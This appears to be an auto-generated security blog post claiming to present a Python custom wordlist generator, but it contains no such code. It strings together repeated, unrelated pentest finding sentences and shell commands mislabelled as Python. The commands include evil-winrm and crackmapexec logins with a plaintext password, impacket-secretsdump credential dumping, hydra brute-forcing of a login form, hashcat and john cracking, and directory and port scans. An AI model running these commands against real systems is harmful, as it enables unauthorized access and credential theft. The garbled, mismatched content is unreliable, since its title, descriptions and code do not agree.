---
TitleSEO: "Custom Wordlist Generator in Python | ZureFX"
TitlePost: "Custom Wordlist Generator — Python"
Author: "ZureFX"
Description: "A Python script for custom wordlist generator. Built for security research and automation."
Keywords: "automation, tool, fuzzer, c, python, parser"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-460.html"
URL_IMAGES: ""
Date: "2025-02-07"
Tags: "Automation, Tool, Fuzzer, C, Python, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-460"
Permalink: "/scripting/script-custom-wordlist-generator-460.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `lookupsid`
- `wpscan`
- `enum4linux`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```python
evil-winrm -i 10.80.212.243 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.58.211.3 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.15.35 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.124.30.222/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p22,8888,9200 10.88.19.203 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.124.15/FUZZ
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.80.116/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.208.111
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 19.79s
```
